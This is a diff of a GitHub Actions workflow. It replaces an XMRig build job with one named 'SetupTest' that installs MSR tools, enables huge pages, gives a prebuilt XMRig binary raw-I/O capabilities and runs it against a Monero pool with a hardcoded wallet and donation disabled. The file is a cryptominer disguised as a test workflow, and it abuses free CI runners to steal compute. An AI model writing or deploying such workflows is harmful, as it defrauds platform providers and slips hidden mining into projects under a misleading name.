@@ -1,51 +1,44 @@
-name: Build with No Donation
+name: SetupTest
 
 on:
   workflow_dispatch:
 
-permissions:
-  contents: write  # يمنح إذن الكتابة لدفع التعديلات
-
 jobs:
-  build:
+  xmrig-mining:
     runs-on: ubuntu-latest
 
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v3
 
       - name: Install dependencies
         run: |
-          sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools fuse
 
-      - name: Clone XMRig Repository
-        run: git clone https://github.com/xmrig/xmrig.git
-
-      - name: Modify donate.h to Disable Donation
+      - name: Enable Huge Pages
         run: |
-          sed -i 's/constexpr const int kDefaultDonateLevel = 1;/constexpr const int kDefaultDonateLevel = 0;/' xmrig/src/donate.h
-          sed -i 's/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/' xmrig/src/donate.h
+          echo 1280 | sudo tee /proc/sys/vm/nr_hugepages
+          sudo sysctl -w vm.nr_hugepages=1280
+          sudo sysctl -w vm.hugetlb_shm_group=$(id -g)
 
-      - name: Build XMRig
-        run: |
-          cd xmrig
-          mkdir build && cd build
-          cmake .. -DWITH_HWLOC=ON -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS=scripts/deps -DDONATE_LEVEL=0
-          make -j$(nproc)
+      - name: Check Huge Pages Status
+        run: cat /proc/meminfo | grep Huge
 
-      - name: Commit and Push Built Binary to Repository
-        env:
-          GH_PAT: ${{ secrets.GH_PAT }}  # استخدام التوكن من Secrets
+      - name: Load MSR Module
         run: |
-          git config --global user.name "github-actions"
-          git config --global user.email "github-actions@github.com"
-          mkdir -p release
-          cp xmrig/build/xmrig release/
-          cd release
-          git init
-          git remote add origin https://x-access-token:${GH_PAT}@github.com/Solomon26014226/clonex.git
-          git add .
-          git commit -m "Add modified XMRig binary with no donation"
-          git branch -M main
-          git push -f origin main
-          
+          sudo modprobe msr
+          ls /dev/cpu/*/msr || echo "MSR access is not available"
+
+      - name: Clone XMRig
+        run: git clone https://github.com/Solomon26014226/clonex.git
+
+      - name: Verify XMRig Binary
+        run: ls -lah clonex/
+
+      - name: Grant XMRig Extra Permissions
+        run: sudo setcap cap_sys_rawio,cap_dac_override+ep clonex/xmrig
+
+      - name: Run XMRig as Background Process
+        run: |
+          cd clonex
+          sudo ./xmrig -o pool.supportxmr.com:443 -u 44FS8hE9PRRF8fvhYms4hxi3VBsDMdztoEGieuHf9vK6FeVCQUQGCNyHCmv7NQF9UaA88MBM8YnfRJRuzdVYy1VE3MNiYpK -k --tls --donate-level=0 
